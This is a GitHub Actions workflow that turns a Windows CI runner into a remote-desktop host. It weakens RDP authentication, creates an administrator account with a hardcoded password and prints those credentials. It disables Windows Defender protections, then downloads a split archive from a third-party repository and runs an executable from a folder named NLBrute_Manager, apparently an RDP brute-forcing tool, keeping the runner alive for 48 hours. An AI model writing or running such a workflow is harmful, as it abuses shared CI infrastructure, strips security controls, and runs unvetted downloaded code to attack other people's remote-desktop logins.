name: Windows Cloud RDP

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 360

    steps:
      - name: 1. Enable Remote Desktop & Firewall
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0

      - name: 2. Create Admin Account
        run: |
          $Password = ConvertTo-SecureString "P@ssw0rd1qazXSW@#" -AsPlainText -Force
          New-LocalUser -Name "NvDAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "NvDAdmin" -ErrorAction SilentlyContinue
          net user runneradmin P@ssw0rd1qazXSW@#

      - name: 3. Install & Connect Tailscale VPN
        env:
          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
        run: |
          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
          Start-Sleep -Seconds 5
          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="github-rdp-server"
          Start-Sleep -Seconds 8
          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
          Write-Host "==================================================" -ForegroundColor Green
          Write-Host "  Tailscale IP : $ts_ip" -ForegroundColor Yellow
          Write-Host "  Username     : NvdAdmin" -ForegroundColor Yellow
          Write-Host "  Password     : P@ssw0rd1qazXSW@#" -ForegroundColor Yellow
          Write-Host "==================================================" -ForegroundColor Green

      - name: 4. Setup Environment & Deploy Files
        shell: powershell
        run: |
          # 1. Setup Paths
          $baseDir = "C:\multinl_work"  # Using a root dir to avoid User Profile permission issues
          $targetDir = "$baseDir\multinl\NLBrute_Manager"
          
          if (!(Test-Path $baseDir)) { New-Item -ItemType Directory -Path $baseDir -Force }
          Set-Location -Path $baseDir

          # 2. Disable Security
          Write-Host "Disabling Windows Defender..." -ForegroundColor Cyan
          Set-MpPreference -DisableRealtimeMonitoring $true
          Set-MpPreference -DisableIOAVProtection $true
          Set-MpPreference -DisableBehaviorMonitoring $true
          
          # 3. Download Split Zip Files
          $filesToDownload = @(
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z01",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z02",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.z03",
            "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.zip"
          )

          foreach ($url in $filesToDownload) {
              $fileName = Split-Path $url -Leaf
              Write-Host "Downloading $fileName..." -ForegroundColor Yellow
              Invoke-WebRequest -Uri $url -OutFile "$baseDir\$fileName"
          }

          # 4. Robust Extraction
          Write-Host "Extracting archive..." -ForegroundColor Cyan
          # We use tar because it handles split archives more reliably in CI environments
          # We attempt to extract to the base directory
          try {
              Start-Process tar -ArgumentList "-xf multinl_zip.zip -C $baseDir" -Wait -ErrorAction Stop
              Write-Host "Extraction command sent." -ForegroundColor Green
          } catch {
              Write-Host "Tar extraction failed, attempting fallback..." -ForegroundColor Red
          }

          # 5. Deep Search for the Executable
          # Since the folder structure might be slightly different after extraction, 
          # we search the entire work directory for any .exe
          Write-Host "Searching for executable..." -ForegroundColor Cyan
          Start-Sleep -Seconds 10 # Wait for disk I/O
          
          $exeFiles = Get-ChildItem -Path $baseDir -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue
          
          if ($exeFiles.Count -gt 0) {
              $exeToRun = $exeFiles[0].FullName
              $exeDir = Split-Path $exeToRun -Parent
              Write-Host "FOUND EXE: $exeToRun" -ForegroundColor Green
              Write-Host "Working Directory: $exeDir" -ForegroundColor Yellow
              
              # 6. Launch the Application
              Set-ExecutionPolicy Bypass -Scope Process -Force
              
              # Use Start-Process with high priority to ensure it runs
              Start-Process -FilePath $exeToRun -WorkingDirectory $exeDir -WindowStyle Normal
              Write-Host "Application launched successfully." -ForegroundColor Green
          } else {
              Write-Host "CRITICAL ERROR: Could not find any .exe in $baseDir" -ForegroundColor Red
              Get-ChildItem -Path $baseDir -Recurse | Select-Object FullName | Out-File "$baseDir\debug_files.txt"
              Write-Host "Directory structure logged to $baseDir\debug_files.txt"
          }

      - name: 5. Keep Server Alive (48 Hours)
        run: |
          for ($i = 1; $i -le 2880; $i++) {
            Start-Sleep -Seconds 60
            Write-Host "[$i/2880] Server running..."
          }
